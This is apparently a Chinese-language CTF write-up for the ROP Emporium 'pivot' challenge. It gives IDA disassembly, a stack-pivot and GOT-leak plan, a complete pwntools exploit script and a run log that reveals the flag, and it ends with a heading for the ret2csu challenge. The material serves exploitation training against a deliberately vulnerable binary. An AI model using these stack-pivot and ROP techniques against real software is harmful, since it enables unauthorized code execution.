
# Pivot

## 代码分析

```
.text:00000000004009C0                 mov     rax, [rax]
.text:00000000004009C3                 retn
.text:00000000004009C3 sub_4009C0      endp
.text:00000000004009C3
.text:00000000004009C4 ; ---------------------------------------------------------------------------
.text:00000000004009C4                 add     rax, rbp
.text:00000000004009C7                 retn
```

提供了 `_foothold_function` 函数，在 `so` 库里，查看 `so` 该函数：

```
.text:000000000000096A foothold_function proc near             ; DATA XREF: LOAD:0000000000000388↑o
.text:000000000000096A ; __unwind {
.text:000000000000096A                 push    rbp
.text:000000000000096B                 mov     rbp, rsp
.text:000000000000096E                 lea     rdi, s          ; "foothold_function(): Check out my .got."...
.text:0000000000000975                 call    _puts
.text:000000000000097A                 nop
.text:000000000000097B                 pop     rbp
.text:000000000000097C                 retn
.text:000000000000097C ; } // starts at 96A
.text:000000000000097C foothold_function endp
```

该函数毫无意义，但是可以用于延迟绑定后提供该 `so` 库的地址泄露

`so` 库里还有个后门函数：

```
.text:0000000000000A81                 public ret2win
.text:0000000000000A81 ret2win         proc near               ; DATA XREF: LOAD:0000000000000448↑o
.text:0000000000000A81 stream          = qword ptr -38h
.text:0000000000000A81 s               = byte ptr -30h
.text:0000000000000A81 var_8           = qword ptr -8
.text:0000000000000A81 ; __unwind {
.text:0000000000000A81                 push    rbp
.text:0000000000000A82                 mov     rbp, rsp
.text:0000000000000A85                 sub     rsp, 40h
.text:0000000000000A89                 mov     rax, fs:28h
.text:0000000000000A92                 mov     [rbp+var_8], rax
.text:0000000000000A96                 xor     eax, eax
.text:0000000000000A98                 mov     [rbp+stream], 0
.text:0000000000000AA0                 lea     rsi, modes      ; "r"
.text:0000000000000AA7                 lea     rdi, filename   ; "flag.txt"
.text:0000000000000AAE                 call    _fopen
.text:0000000000000AB3                 mov     [rbp+stream], rax
.text:0000000000000AB7                 cmp     [rbp+stream], 0
.text:0000000000000ABC                 jnz     short loc_AD4
.text:0000000000000ABE                 lea     rdi, aFailedToOpenFi ; "Failed to open file: flag.txt"
.text:0000000000000AC5                 call    _puts
.text:0000000000000ACA                 mov     edi, 1          ; status
.text:0000000000000ACF                 call    _exit
.text:0000000000000AD4 ; ---------------------------------------------------------------------------
.text:0000000000000AD4 loc_AD4:                                ; CODE XREF: ret2win+3B↑j
.text:0000000000000AD4                 mov     rdx, [rbp+stream] ; stream
.text:0000000000000AD8                 lea     rax, [rbp+s]
.text:0000000000000ADC                 mov     esi, 21h ; '!'  ; n
.text:0000000000000AE1                 mov     rdi, rax        ; s
.text:0000000000000AE4                 call    _fgets
.text:0000000000000AE9                 lea     rax, [rbp+s]
.text:0000000000000AED                 mov     rdi, rax        ; s
.text:0000000000000AF0                 call    _puts
.text:0000000000000AF5                 mov     rax, [rbp+stream]
.text:0000000000000AF9                 mov     rdi, rax        ; stream
.text:0000000000000AFC                 call    _fclose
.text:0000000000000B01                 mov     [rbp+stream], 0
.text:0000000000000B09                 mov     edi, 0          ; status
.text:0000000000000B0E                 call    _exit
.text:0000000000000B0E ; } // starts at A81
.text:0000000000000B0E ret2win         endp
.text:0000000000000B0E _text           ends
```

## 利用思路

思路现在就是：

- 执行 `_foothold_function` 函数
- 打印 `_foothold_function` 的 `got` 表，泄露地址，拿到 `win` 函数地址
- 返回到 `pwnme` 函数的末尾 `read` 函数调用
- 这里要注意 `rbp` 的值，以及 `leave` 之后的 `rsp`，适当的调整以至于能覆盖到返回地址
- 调用 `win` 函数

在此之前，需要进行栈迁移：

- 读取提供的可控缓冲区地址
- 使用该地址覆盖 `rbp`
- 返回地址跳转到 `leave; ret` 指令，完成迁移

## EXP

```
#!/bin/python3
from Crypto.Util.number import *
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "./pivot"
REMOTE_HOST = ""
REMOTE_PORT = 0

elf = context.binary = ELF(FILE_NAME)
libc = elf.libc

gs = '''
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# =======================================

io = start()

# =============================================================================
# ============== exploit ===================

io.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
buffer = io.recvline()[:-1]
buffer = int(buffer.decode(),16)
buffer = buffer 
print(hex(buffer))

_foothold_function_plt = 0x00000000400720
_foothold_function_got = 0x00000000601040
main = 0x000000000400985
rop = ROP(elf)
rop.raw(_foothold_function_plt)
rop.puts(_foothold_function_got)
rop.rbp=buffer + 0x60
rop.raw(main)
io.sendafter(b"> ",b"A" *   0x8 + rop.chain())

padding = b"A" * 0x20
payload2 = padding + pack(buffer) + pack(next(elf.search(asm("leave;ret"))))
print(payload2)
io.sendafter(b"> ",payload2)

io.recvuntil(b"foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n")
leak = io.recvline()[:-1]
leak = u64(leak.ljust(8, b"\x00"))
print(hex(leak))

baseso = leak - 0x96a
win = baseso + 0xa81
payload3 = b"A"*0x28+ pack(win)
io.send(payload3)

io.interactive()
```

## 运行结果

```
pivot.zip.d ➤ ./exp_cli.py debug pivot '/home/selph/ctf/CTF_selph/rop_emporium_all_challenges/x64/pivot.zip.d/pivot'

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'

[+] Starting local process '/home/selph/ctf/CTF_selph/rop_emporium_all_challenges/x64/pivot.zip.d/pivot': pid 123437
0x7fc5097d5f10
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10_}\t\xc5\x7f\x00\x00\xef\x08@\x00\x00\x00\x00\x00'
0x7fc509a0096a
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

3> 8. `ret2csu`

缓解机制：【NX】

程序：`pwnme` 在 `so` 库里
